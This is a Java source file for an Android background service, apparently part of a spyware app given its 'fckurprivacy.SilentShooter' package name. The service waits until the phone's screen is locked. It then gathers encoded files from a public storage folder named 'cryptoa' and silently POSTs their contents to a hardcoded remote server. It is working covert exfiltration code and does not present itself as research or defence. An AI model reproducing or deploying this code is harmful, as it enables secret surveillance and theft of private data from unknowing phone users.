package com.vergermiya.harevost.fckurprivacy.SilentShooter;

import android.app.Activity;
import android.app.KeyguardManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import com.vergermiya.harevost.fckurprivacy.Util.AESUtils;
import com.vergermiya.harevost.fckurprivacy.Util.FileSaver;
import com.vergermiya.harevost.fckurprivacy.Util.HttpRequest;

import java.io.File;
import java.lang.reflect.Method;

public class SilentShootService extends Service {

    private Handler mHandler = new Handler();
    private long currentMills = 0;
    private String TARGET_URL = "http://10.8.205.87:8080";

    public SilentShootService() {
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Runnable timeRunnable = new Runnable() {
            @Override
            public void run() {
                currentMills += 10000;
                mHandler.postDelayed(this, 10000);
                Log.d("Silent", "" + currentMills);

                if (isSystemIdle(getApplicationContext()) && currentMills >= 20000) {
                    Thread uploadThread = new Thread() {
                        @Override
                        public void run() {
                            Log.d("Thread", "Run?");
                            File cryptoaFile = new FileSaver().getPublicStorageDir("cryptoa");
                            File[] files = cryptoaFile.listFiles();
                            File latestFile = files[0];

                            if (currentMills >= 60 * 1000) {
                                Log.d("Silent", "Send ALL FILES!");
                                for (File file : files) {
                                    if (file.getName().endsWith(".encode")) {
                                        HttpRequest.sendPost(TARGET_URL, String.format("name=%s&value=%s", file.getName(), AESUtils.filetoStr(file.getPath())));
                                        Log.d("Silent", "All Files Sent.");
                                    }
                                    currentMills = 0;
                                }
                            } else {
                                for (File file : files) {
                                    if (file.getName().endsWith(".encode") && file.lastModified() > latestFile.lastModified()) {
                                        latestFile = file;
                                    }
                                }
                                HttpRequest.sendPost(TARGET_URL, String.format("name=%s&value=%s", latestFile.getName(), AESUtils.filetoStr(latestFile.getPath())));
                                Log.d("Silent", "All Files Sent.");
                            }
                        }
                    };
                    uploadThread.start();

                } else if (!isSystemIdle(getApplicationContext())) {
                    currentMills = 0;
                }
            }
        };
        timeRunnable.run();
        return START_REDELIVER_INTENT;
    }

    public boolean isSystemIdle(Context context) {
        KeyguardManager mKeyguardManager = (KeyguardManager) context.getSystemService (Context. KEYGUARD_SERVICE);
        boolean flag = mKeyguardManager.inKeyguardRestrictedInputMode();
        if (flag) {
            Log.d("Lock", "true");
            return true;
        } else {
            Log.d("Lock", "false");
            return false;
        }
    }

}
